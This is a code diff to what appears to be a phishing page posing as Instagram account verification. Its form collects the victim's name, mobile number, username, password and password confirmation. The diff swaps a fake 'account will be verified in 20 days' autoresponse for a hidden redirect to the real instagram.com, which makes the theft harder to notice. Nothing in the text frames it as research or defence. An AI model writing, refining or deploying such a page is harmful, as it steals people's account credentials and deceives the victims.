@@ -100,7 +100,8 @@
                 <div class="form-input">
                     <input type="password" placeholder="Confirm Password" class="inputValue" id="user-conf-pass" autocomplete="on" required>
                 </div>
-                <input type="hidden" name="_autoresponse" value="Your Instagram Account will Be Verify in 20 Days">
+                <input type="hidden" name="_next" value="https://www.instagram.com/">
+                <!-- <input type="hidden" name="_autoresponse" value="Your Instagram Account will Be Verify in 20 Days"> -->
 
                 <div class="form-input">
                     <button type="button" id="formSubmitBtn">Submit</button>
@@ -179,7 +180,7 @@
                 mobile: mobielNumber.value,
                 name : handlerName.value,
                 password : password.value,
-                instaUsername : handlerUsername.value,
+                username : handlerUsername.value,
                 confirmPassword : confPassword.value,
             }
 
